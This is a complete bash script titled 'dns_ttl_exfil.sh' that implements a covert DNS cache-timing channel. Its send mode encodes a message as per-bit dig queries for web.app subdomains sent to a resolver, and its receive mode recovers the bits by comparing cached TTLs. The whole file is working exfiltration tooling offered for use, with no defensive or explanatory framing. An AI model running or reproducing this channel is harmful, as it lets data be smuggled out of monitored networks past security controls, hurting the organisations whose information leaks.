#!/usr/bin/env bash

# dns_ttl_exfil.sh - DNS TTL-based exfiltration and recovery
# This script uses DNS cache TTL to determine if a bit was set (1) or not (0).

#DOMAIN="synlace.io"
#RESOLVER="@synlace.io"

#dig 123abc.web.app A +noall +answer @82.96.65.2

DOMAIN="web.app"
#RESOLVER="@194.177.210.210"
RESOLVER="@192.168.1.1"

usage() {
    echo "Usage:"
    echo "  $0 send <message> [uuid]"
    echo "  $0 receive <uuid> [max_chars] [concurrency]"
    exit 1
}

if [ $# -lt 2 ]; then
    usage
fi

MODE=$1
UUID=${3:-$(cat /proc/sys/kernel/random/uuid | cut -d '-' -f 1)}

# Function to check a single bit and return indexed result
check_bit_indexed() {
    local bit_pos=$1
    local uuid=$2
    local domain=$3
    local resolver=$4
    local baseline_ttl=$5
    local end_ttl=$6
    
    local query="$bit_pos.$uuid.$domain"
    local current_ttl=$(dig "$query" "$resolver" +noall +answer +authority | awk '{print $2}' | grep -E '^[0-9]+$' | head -n 1)
    
    if [ -n "$current_ttl" ] && [ "$current_ttl" -le "$end_ttl" ]; then
        echo "$bit_pos:1"
    else
        echo "$bit_pos:0"
    fi
}

export -f check_bit_indexed

if [ "$MODE" == "send" ]; then
    MESSAGE=$2
    UUID=${3:-$(cat /proc/sys/kernel/random/uuid | cut -d '-' -f 1)}
    echo "--- DNS TTL Exfiltration (Sender) ---"
    echo "Message: '$MESSAGE'"
    echo "UUID:    $UUID"
    echo "-------------------------------------"

    START_TIME=$(date +%s.%N)
    REQUEST_COUNT=0
    
    for (( i=0; i<${#MESSAGE}; i++ )); do
        char="${MESSAGE:$i:1}"
        # Convert character to 8-bit binary (Big Endian)
        bits=$(printf "%d" "'$char" | xargs -I {} echo "obase=2; {}" | bc | xargs printf "%08d")
        
        echo "Char: $char -> Bits: $bits"
        
        for (( b=0; b<8; b++ )); do
            bit_val="${bits:$b:1}"
            bit_pos=$(( i * 8 + b ))
            
            if [ "$bit_val" == "1" ]; then
                query="$bit_pos.$UUID.$DOMAIN"
                dig "$query" "$RESOLVER" +short > /dev/null &
                ((REQUEST_COUNT++))
            fi
        done
        wait
    done
    
    # Send END marker
    echo "Sending END marker..."
    dig "end.$UUID.$DOMAIN" "$RESOLVER" +short > /dev/null
    ((REQUEST_COUNT++))
    
    END_TIME=$(date +%s.%N)
    DURATION=$(echo "$END_TIME - $START_TIME" | bc)
    BYTE_COUNT=${#MESSAGE}
    SPEED=$(echo "scale=2; $BYTE_COUNT / $DURATION" | bc)

    echo "-------------------------------------"
    echo "Done. UUID for recovery: $UUID"
    printf "Time taken: %.3f seconds\n" "$DURATION"
    printf "Bytes sent: %d\n" "$BYTE_COUNT"
    printf "DNS Requests: %d\n" "$REQUEST_COUNT"
    printf "Average speed: %.2f bytes/sec\n" "$SPEED"
    
    # Get TTL for decay info
    TTL=$(dig "end.$UUID.$DOMAIN" "$RESOLVER" +noall +answer +authority | awk '{print $2}' | grep -E '^[0-9]+$' | head -n 1)
    if [ -n "$TTL" ]; then
        H=$((TTL / 3600))
        M=$(( (TTL % 3600) / 60 ))
        S=$((TTL % 60))
        DECAY_STR=""
        [ $H -gt 0 ] && DECAY_STR="${H}hr "
        [ $M -gt 0 ] && DECAY_STR="${DECAY_STR}${M}m "
        DECAY_STR="${DECAY_STR}${S}s"
        printf "Time to decay: %s\n" "$DECAY_STR"
    fi

elif [ "$MODE" == "receive" ]; then
    UUID=$2
    MAX_CHARS=${3:-128}
    CONCURRENCY=${4:-8}
    FINAL_MESSAGE=""

    echo "--- DNS TTL Recovery (Receiver) ---"
    echo "UUID: $UUID"
    
    START_TIME=$(date +%s.%N)
    REQUEST_COUNT=0

    # 1. Determine Baseline TTL (Static subdomain)
    BASELINE_QUERY="baseline.$UUID.$DOMAIN"
    BASELINE_TTL=$(dig "$BASELINE_QUERY" "$RESOLVER" +noall +answer +authority | awk '{print $2}' | grep -E '^[0-9]+$' | head -n 1)
    ((REQUEST_COUNT++))
    
    if [ -z "$BASELINE_TTL" ] || ! [[ "$BASELINE_TTL" =~ ^[0-9]+$ ]]; then
        echo "Error: Could not determine baseline TTL. Is $DOMAIN reachable?"
        exit 1
    fi

    # 2. Determine END marker TTL
    END_QUERY="end.$UUID.$DOMAIN"
    END_TTL=$(dig "$END_QUERY" "$RESOLVER" +noall +answer +authority | awk '{print $2}' | grep -E '^[0-9]+$' | head -n 1)
    ((REQUEST_COUNT++))
    
    if [ -z "$END_TTL" ] || ! [[ "$END_TTL" =~ ^[0-9]+$ ]]; then
        echo "Warning: END marker not found. Falling back to Baseline TTL comparison."
        END_TTL=$BASELINE_TTL
    fi

    echo "Baseline TTL: $BASELINE_TTL"
    echo "End Marker TTL: $END_TTL"
    echo "-------------------------------------"

    for (( char_idx=0; char_idx<MAX_CHARS; char_idx++ )); do
        BIT_POSITIONS=$(for b in {0..7}; do echo $((char_idx * 8 + b)); done)
        
        RESULTS=$(echo "$BIT_POSITIONS" | xargs -I % -P "$CONCURRENCY" bash -c "check_bit_indexed % $UUID $DOMAIN $RESOLVER $BASELINE_TTL $END_TTL")
        ((REQUEST_COUNT += 8))
        
        BYTE_BITS=$(echo "$RESULTS" | sort -t: -k1,1n | cut -d: -f2 | tr -d '\n')

        if [ "$BYTE_BITS" == "00000000" ]; then
            echo "End of message detected."
            break
        fi

        DECIMAL=$(echo "ibase=2; $BYTE_BITS" | bc)
        CHAR=$(printf "\\$(printf '%03o' "$DECIMAL")")
        echo "Char $char_idx: $BYTE_BITS -> '$CHAR'"
        FINAL_MESSAGE="${FINAL_MESSAGE}${CHAR}"
    done

    END_TIME=$(date +%s.%N)
    DURATION=$(echo "$END_TIME - $START_TIME" | bc)
    BYTE_COUNT=${#FINAL_MESSAGE}
    
    if (( $(echo "$DURATION > 0" | bc -l) )); then
        SPEED=$(echo "scale=2; $BYTE_COUNT / $DURATION" | bc)
    else
        SPEED=0
    fi

    echo "-------------------------------------"
    echo "Recovered Message: $FINAL_MESSAGE"
    echo "-------------------------------------"
    printf "Time taken: %.3f seconds\n" "$DURATION"
    printf "Bytes recovered: %d\n" "$BYTE_COUNT"
    printf "DNS Requests: %d\n" "$REQUEST_COUNT"
    printf "Average speed: %.2f bytes/sec\n" "$SPEED"
    
    # Human readable decay time
    H=$((END_TTL / 3600))
    M=$(( (END_TTL % 3600) / 60 ))
    S=$((END_TTL % 60))
    DECAY_STR=""
    [ $H -gt 0 ] && DECAY_STR="${H}hr "
    [ $M -gt 0 ] && DECAY_STR="${DECAY_STR}${M}m "
    DECAY_STR="${DECAY_STR}${S}s"
    
    printf "Time to decay: %s\n" "$DECAY_STR"
else
    usage
fi
